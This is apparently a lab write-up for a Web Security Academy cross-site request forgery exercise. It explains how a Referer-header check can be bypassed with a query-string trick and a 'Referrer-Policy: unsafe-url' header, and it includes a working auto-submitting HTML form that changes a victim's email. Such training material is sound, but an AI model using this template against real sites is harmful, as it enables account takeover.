*This information is only for the purposes of education and skills development. GET and POST are not acronyms.*

**Objective:** User account email address change.

**Request being forged:** Email change request

**Cross Site because:** Forged request for unintended email change comes from exploit server, not the blogsite.

**Point of Entry**
- Referrer header in POST request for email change is vulnerable, because the database requires a match to any web address including *?YOUR-LAB-ID.web-security-academy.net*. 
- Referrer header's validity does not affect the request's validity, making a mere presence of *?YOUR-LAB-ID.web-security-academy.net* our entry point.

**Barrier to entry** 
- As a security measure, most browsers remove the query string from the referrer header. 
- Due to this, our exploit results in an *invalid header* error.

**Bypassing barrier to entry**
Add `Referrer-Policy: unsafe-url` to exploit head.

**Template**
 `<html>`
  `<body>`
`<script> history.pushState("", "", "/?0aaf009f03f714e48012bc9300d200ca.web-security-academy.net")</script>`
    `<form action="https://0aaf009f03f714e48012bc9300d200ca.web-security-academy.net/my-account/change-email" method="POST">`
      `<input type="hidden" name="email" value="bababa&#64;gm&#46;com" />`
      `<input type="submit" value="Submit request" />`
    `</form>`
    `<script>`
      `document.forms[0].submit();`
    `</script>`
  `</body>`
`</html>`